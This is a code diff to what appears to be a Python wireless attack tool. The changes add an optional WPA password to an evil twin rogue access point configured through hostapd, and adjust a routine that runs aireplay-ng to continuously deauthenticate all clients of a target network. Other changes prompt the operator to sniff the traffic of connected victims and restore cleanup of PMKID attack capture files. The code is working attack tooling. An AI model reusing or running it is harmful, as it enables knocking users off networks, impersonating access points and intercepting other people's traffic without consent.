@@ -641,7 +641,7 @@ def scan_ap(interface):
                })
                     
      # Sort array by signal strength (strongest first)
-     wifi_networks = sorted(wifi_networks, key=lambda x: x['Signal'], reverse=False)
+     wifi_networks = sorted(wifi_networks, key=lambda x: int(x['Signal']), reverse=True)
 
      return wifi_networks
 
@@ -1278,6 +1278,8 @@ def evil_twin(target_ap, twin_mode):
                          if not check_internet(internet_interface):
                               continue
 
+                         password = str(input('Enter password for Evil Twin Wifi network (Leave blank input for Open Wifi network): '))
+
                          break # If all requirements met, stop the interface choosing loop
                else:
                     print(f"{RED}You need atleast {req_interfaces} network interfaces in order to run this attack!{RESET}")
@@ -1301,12 +1303,12 @@ def evil_twin(target_ap, twin_mode):
 
                def run_aireplay(interface, bssid):
                     if interface and bssid:
-                              try:
-                                   # Continuosly deauth deauth all clients
-                                   command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
-                                   subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                              except:
-                                   pass
+                         try:
+                              # Continuosly deauth deauth all clients
+                              command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
+                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=None)
+                         except:
+                              pass
 
                # Setup DHCP server
                dhcpd_config_file = "/etc/sysconfig/dhcpd"
@@ -1354,8 +1356,10 @@ subnet 192.168.100.0 netmask 255.255.255.0 {
                hostapd_conf_file = "/etc/hostapd.conf"
                if band == "5 GHz": # Handle 5GHz networks - not supported
                     channel = '1'
-               with open(hostapd_conf_file, "w") as f:
-                    f.write(textwrap.dedent(f"""\
+               
+               if password:
+                    with open(hostapd_conf_file, "w") as f:
+                         f.write(textwrap.dedent(f"""\
 interface={evil_interface}
 driver=nl80211
 ssid={ssid}
@@ -1364,7 +1368,25 @@ hw_mode=g
 ieee80211n=1
 wme_enabled=1
 macaddr_acl=0
-                    """))
+
+auth_algs=1
+wpa=2
+wpa_passphrase={password}
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+                         """))
+               else:
+                    with open(hostapd_conf_file, "w") as f:
+                         f.write(textwrap.dedent(f"""\
+interface={evil_interface}
+driver=nl80211
+ssid={ssid}
+channel={channel}
+hw_mode=g
+ieee80211n=1
+wme_enabled=1
+macaddr_acl=0
+                         """))
                print(f'{CYAN}[>]{RESET} Hostapd configuration set')
 
                signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user 
@@ -1404,8 +1426,11 @@ macaddr_acl=0
                
                print(f'\n{CYAN}[>]{RESET} Internet for clients via "{evil_interface}" - "{internet_interface}" forward\n')
 
-               print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - SSID: "{ssid}"')
-               print(f'You can sniff caught clients traffic on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!')
+               if password:
+                    print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - SSID: "{ssid}", Wifi password: "{password}"')
+               else:
+                    print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - SSID: "{ssid}"')
+               print(f'{YELLOW}You can sniff connected clients on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!{RESET}')
                # Run the Evil Twin AP
                run_command("sudo hostapd /etc/hostapd.conf")
                
@@ -1560,7 +1585,6 @@ else:
                try:
                     pmkid_attack(target_ap, interface, target)
                except:
-                    """
                     if output_dir and output_file and delete_capture:
                          try:
                               file_num = output_file.split('-')[1]
@@ -1576,7 +1600,6 @@ else:
                                    os.system(f'sudo rm {output_dir}/pmkid_hash') 
                               if os.path.exists(f'{output_dir}/pmkid_cracked.txt'):
                                    os.system(f'sudo rm {output_dir}/pmkid_cracked.txt') 
-                    """
           elif attack == 'Jamming':
                jammer_mode = choose_jammer_mode()
                if jammer_mode:
